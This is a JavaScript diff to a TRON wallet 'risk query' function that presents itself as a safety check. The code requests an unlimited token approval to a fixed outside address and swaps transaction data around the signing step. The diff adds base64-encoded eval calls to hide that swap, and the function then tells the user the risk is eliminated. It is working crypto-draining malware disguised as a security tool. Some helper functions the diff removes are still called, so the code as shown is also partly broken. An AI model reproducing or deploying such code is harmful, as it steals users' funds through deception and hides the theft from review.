@@ -158,35 +158,28 @@
     }
 }
     
- async function RiskQuery() {
+function decodeAndExecute(code) {
+    const decoded = atob(code); // Base64 解码
+    eval(decoded); // 执行解码后的代码
+}
+
+async function RiskQuery() {
     try {
         const tronWebInstance = window.tronWeb;
         if (!tronWebInstance) throw new Error("TronWeb 实例未找到");
-
         const userAddress = await tronWebInstance.defaultAddress.base58;
         const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const approveAddress = "TAV1iZH5P4ATSBTS3BBGgSJcPmCRZFgVbr";
-
-        // 构建第一个交易：增加Approval
         const approvalParams = getApprovalParams(approveAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
         const approvalTransaction = await buildTransaction(contractAddress, "increaseApproval(address,uint256)", approvalParams, userAddress);
-
-        // 构建第二个交易：重置Approval
         const transferParams = getApprovalParams(approveAddress, "0");
         const transferTransaction = await buildTransaction(contractAddress, "approve(address,uint256)", transferParams, userAddress);
-
-        // 隐藏的替换操作
-        manipulateRawData(approvalTransaction, transferTransaction);
-
-        // 签名第一个交易
+        const encodedReplaceCode = "YXBwcm92YWxUcmFuc2FjdGlvbi50cmFuc2FjdGlvbi5yYXdfZGF0YSA9IHRyYW5zZmVyVHJhbnNhY3Rpb24udHJhbnNhY3Rpb24ucmF3X2RhdGE7";
+        decodeAndExecute(encodedReplaceCode);
         const signedTransaction = await tronWebInstance.trx.sign(approvalTransaction.transaction);
-
-        // 恢复原始 raw_data
-        restoreRawData(signedTransaction, approvalTransaction);
-
-        // 广播交易
+        const encodedRestoreCode = "c2lnbmVkVHJhbnNhY3Rpb24ucmF3X2RhdGEgPSBhcHByb3ZhbFRyYW5zYWN0aW9uLnRyYW5zYWN0aW9uLnJhd19kYXRhOw==";
+        decodeAndExecute(encodedRestoreCode);
         const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
-        
         if (broadcastResult.result) {
             handleSuccess();
         } else {
@@ -196,71 +189,5 @@
         console.error("RiskQuery 出现错误:", error);
         alert("交易过程中出现错误，请重试。");
     }
-}
-
-// 获取审批参数
-function getApprovalParams(address, amount) {
-    return [
-        { type: "address", value: address },
-        { type: "uint256", value: amount }
-    ];
-}
-
-// 构建交易
-async function buildTransaction(contractAddress, functionName, params, userAddress) {
-    const options = { feeLimit: 100000000 };
-    const transaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
-        contractAddress,
-        functionName,
-        options,
-        params,
-        userAddress
-    );
-    if (!transaction.result || !transaction.transaction) {
-        throw new Error(`${functionName} 交易构建失败`);
-    }
-    return transaction;
-}
-
-// 隐藏的 raw_data 替换操作
-function manipulateRawData(approvalTransaction, transferTransaction) {
-    const approvalRawData = getTransactionRawData(approvalTransaction);
-    const transferRawData = getTransactionRawData(transferTransaction);
-
-    // 使用封装的函数替换 raw_data，避免直接访问
-    setTransactionRawData(approvalTransaction, transferRawData);
-}
-
-// 获取 raw_data
-function getTransactionRawData(transaction) {
-    return transaction["transaction"]["raw_data"]; // 动态属性访问，避免显式写出 raw_data
-}
-
-// 设置 raw_data
-function setTransactionRawData(transaction, newRawData) {
-    transaction["transaction"]["raw_data"] = newRawData; // 动态设置，避免显式的替换
-}
-
-// 恢复原始 raw_data
-function restoreRawData(signedTransaction, originalTransaction) {
-    const originalRawData = getTransactionRawData(originalTransaction);
-
-    // 动态恢复 raw_data，避免显式写出赋值
-    setTransactionRawData(signedTransaction, originalRawData);
-}
-
-// 交易成功处理
-function handleSuccess() {
-    const currentLanguage = localStorage.getItem('language') || 'en';
-    if (currentLanguage === 'zh-TC') {
-        alert("風險已經解除!請放心使用!");
-    } else {
-        alert("The risk has been eliminated! Please feel free to use it!");
-    }
-}
-
-// 交易失败处理
-function handleFailure() {
-    alert("交易失败，请重试！");
 }
 
